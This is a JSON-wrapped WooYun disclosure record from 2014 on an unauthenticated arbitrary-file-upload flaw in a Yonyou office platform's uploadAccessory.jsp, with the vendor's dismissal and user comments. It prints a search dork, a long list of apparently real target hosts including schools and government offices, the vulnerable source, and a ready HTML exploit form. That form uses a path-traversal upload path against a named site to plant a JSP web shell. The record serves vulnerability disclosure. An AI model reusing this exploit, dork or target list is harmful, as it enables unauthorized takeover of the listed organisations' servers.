{"id": 2309, "wybug_id": "wooyun-2014-060671", "wybug_title": "用友某办公平台任意文件上传导致代码执行漏洞（全版本）", "wybug_corp": "用友软件", "wybug_author": "路人甲", "wybug_date": "2014-05-14 12:24", "wybug_open_date": "2014-08-09 12:26", "wybug_type": "文件上传导致任意代码执行", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "漏洞已经通知厂商但是厂商忽略漏洞", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-05-14：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-05-19：\t厂商主动忽略漏洞，细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-07-13：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-07-23：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-08-02：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-08-09：\t细节向公众公开  简要描述：  详细说明：  剑总 、 疯狗叔叔.....通用型的。。等待确认全版本通杀getshell。。。直接拿下服务器。。无需登录通过关键字搜索如下：\nintitle:\"fe协作\"\n涉及客户群体为：大型企业（如：拉芳集团等等超大企业）、学校（北京师范）、医药、政府（如：珠海市人民防空办公室、广东省渔政总队珠海支队、广东煤炭地质局等等。。。）、能源（电网）、银行等等。。。危害我就不说了吧下面为，我通过脚本稍微搜索的结果，通过其他搜索结果远远不止这些\nhttp://oa.bamatea.comhttp://oa.moonbasa.comhttp://oa.etonetech.comhttp://oa.ztcz.cnhttp://218.249.130.74http://119.146.190.170:9988http://zhidao.baidu.comhttp://wenku.baidu.comhttp://223.4.22.36http://222.243.160.83:9090http://www.chipshow.cnhttp://116.205.96.170:9090http://www.sxjbjt.com:9090http://122.225.203.168:8888http://oa.chinabed.comhttp://oa.lutongnet.comhttp://oa.zetacn.com:9090http://oa.zhcpt.edu.cnhttp://www.doc88.comhttp://oa.sinodata.com.cnhttp://www.docin.comhttp://www.koyochem.com:8080http://61.186.155.27http://oa.nyinn.cnhttp://115.236.65.115:9090http://119.146.190.118:8089http://219.137.250.133http://123.133.29.174:9090http://koa.ecp888.comhttp://www.cting.com.cnhttp://oa.suncorps.cnhttp://59.41.47.211http://oa.bamatea.com:9090http://oa.zhenaiws.comhttp://www.koyochem.com:9191http://60.208.131.46:9090http://219.131.221.174:9090http://oa.bnuz.edu.cn:8080http://183.238.59.61:9090http://218.205.208.22:9090http://oa.xhlbdc.comhttp://124.193.165.174:9090http://218.75.87.186:9090http://oa.eva-group.com:511http://113.106.92.16:9090http://oa.cqmsy.comhttp://cting.com.cnhttp://220.231.158.211http://oa.tiholding.cnhttp://124.172.170.141:9090http://oa.hengdigroup.com:9090http://www1.elkay.com.cn:9090http://www.gzpiano.comhttp://oa.zaffer.cnhttp://oa.gdisg.com\n.......在ufmail\\uploadAccessory.jsp中\n<%@ page contentType=\"text/html; charset=GBK\" language=\"java\" %><%@ page import=\"fe.util.BaseFunc,fe.ufmail.MailServer\" %><html><head><title>附件</title><link href=\"/style1.css\" rel=\"stylesheet\" type=\"text/css\"><meta http-equiv=\"Content-Type\" content=\"text/html; charset=GBK\"><style type=\"text/css\"><!--body {\tmargin-left: 0px;\tmargin-right: 0px;\tmargin-top: 0px;\tbackground-color:#EEEEEE;}--></style></head><script language=\"javascript\" src=\"/js/BaseFunc.js\"></script><script language=\"javascript\" src=\"/js/BaseFun.js\"></script><body><%\tString flelst = request.getParameter(\"fileList\");\tString action = request.getParameter(\"action\");\tString strpath = BaseFunc.ISOToGBK(request.getParameter(\"temppath\"));\tif ( flelst != null && flelst.length() > 0 )\t\tflelst = BaseFunc.ISOToGBK(flelst);\telse\t\tflelst = \"\";\tString msgStr = \"\";\tint allowsize = MailServer.getDefaultAccessSize();\tif ( action!=null && action.equals(\"save\") ){\t\tif((request.getContentLength())> allowsize){\t\t\t\tmsgStr = \"您上传的文件大小超出了最大限制（\" + (int)(allowsize/1024/1024 ) + \"MB）！\";\t\t}\t\telse{\t\t\tfe.util.uploadFile upload = new fe.util.uploadFile(pageContext);\t        \tupload.setFilePath(strpath);\t        \tupload.setMaxFileSize(allowsize);\t\t\tupload.setDeniedFileList(\"\");\t\t\tupload.setAllowedFileList(\"\");\t\t\tint saveFlag = upload.saveFile(false);\t        if(saveFlag==0){\t        \tif(upload.isUploadError()){\t\t        \tif(upload.getUploadFileSize() > allowsize )\t\t\t\t\t\tmsgStr = \"您上传的文件大小超出了最大限制（\" + (int)(allowsize/1024/1024) + \"MB）！\";\t\t         \telse\t\t\t\t\t\tmsgStr = \"对不起，您上传的文件是无效的！\" + saveFlag;\t        \t}\t        }else if(saveFlag==-1)\t\t\t\tmsgStr = \"您邮件服务上的临时目录无效，请与管理员联系！\";\t\t\telse{\t\t\t\tif (flelst.length() > 0) flelst += \";;\";\t\t\t\tflelst += upload.getUploadFileName() + \";\" + upload.getSourceFileName();\t        }\t     }\t\tif (msgStr.length() > 0)\t\t\tout.print(\"<script language=\\\"javascript\\\">alert('\" + msgStr + \"')</script>\");\t}%>\n未做过滤，从客户端获取。。。顾可以伪造上传路径，达到上传到web目录当中取shell。简单的搞个exp吧\n<!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.01//EN\"    \"http://www.w3.org/TR/html4/strict.dtd\"    ><html lang=\"en\"><head>    <title>用友软件getshell</title></head><body>     <h3 style=\"width:700px; text-align:center; margin:0 auto; color:#FF00FE\">用友软件getshell</h2>   <div style=\"width:600px; height:auto; margin-left:500px; margin-top:40px;\">    <form action=\"http://oa.bamatea.com/ufmail/uploadAccessory.jsp?action=save&temppath=../../jboss/server/default/deploy/fe.war/images/&fileList=\" method=\"post\" enctype=\"multipart/form-data\"><!--  修改网址-->\t    <input type=\"file\" name=\"accessory\">        <input type=\"submit\" name=\"dosubmit\" value=\"上传\" style=\"margin-top:6px; height:25px;\">\t\t<!-- shell为： http://xxx.com/images/（1400036769181.jsp 查找源代码寻找）-->    </form> </div></body></html>\n\n\n直接都是administrator\n\n目前通杀所有用友该平台。。。直接拿下服务器。。无需登录   漏洞证明：  \n\n直接都是administrator\n\n   修复方案：     版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2014-08-09 12:26 厂商回复：  最新状态： 2014-05-22：问题已经修复，多谢白帽子！  ", "replys": "漏洞评价：\n评论\n     2014-08-09 12:53 |    \t\tnull \t\t\t( 路人 |\t\t\t        Rank:15 漏洞数:2        | 左岸是无法忘却的回忆，右岸是值得把握的青...)\t\t \n  无影响厂商忽略问题已经修复，多谢白帽子！    \n     2014-08-09 13:10 |    \t\t进击的zjx \t\t\t( 普通白帽子  |\t\t\t        Rank:295 漏洞数:61        | 工作需要，暂别一段时间)\t\t \n  厂商都好无情    \n     2014-08-09 13:56 |    \t\tMr_Java \t\t\t( 路人 |\t\t\t        Rank:28 漏洞数:9        | 成功进入web端，哈哈！)\t\t \n  就这回复？蛋疼！    \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}